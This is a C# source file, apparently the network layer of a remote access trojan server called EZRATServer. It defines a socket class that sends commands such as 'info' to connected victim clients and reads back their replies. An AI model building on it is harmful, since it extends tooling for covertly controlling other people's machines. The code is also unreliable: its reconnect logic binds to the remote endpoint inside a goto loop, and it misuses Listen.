using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using EZRATServer.Utils;

namespace EZRATServer.Network
{

    class RATClient : Socket
    {
        public RATClient(SocketType socketType, ProtocolType protocolType) : base(socketType, protocolType)
        {
        }

        public RATClient(AddressFamily addressFamily, SocketType socketType, ProtocolType protocolType) : base(addressFamily, socketType, protocolType)
        {
        }

        public RATClient(SocketInformation socketInformation) : base(socketInformation)
        {
        }


        public bool Connected
        {
            get { return base.Connected; }
        }

        public void SendData(string data)
        {
            byte[] text = Encoding.Default.GetBytes(data);
            SendData(text);
        }
        public void SendData(byte[] data)
        {
            SEND:
            if (data != null && base.Connected)
            {
                base.Send(data);
            }
            else if (!base.Connected)
            {
                base.Bind(this.RemoteEndPoint);
                goto SEND;
            }
        }
        public ClientData GetDataFromClient(int id)
        {
            SendData("info");
            this.Listen(1);
            byte[] data = new byte[1024];
            this.Receive(data);
            string result = Encoding.Default.GetString(data);
            return new ClientData(id, result, result, result, result, result);
        }
    }
}
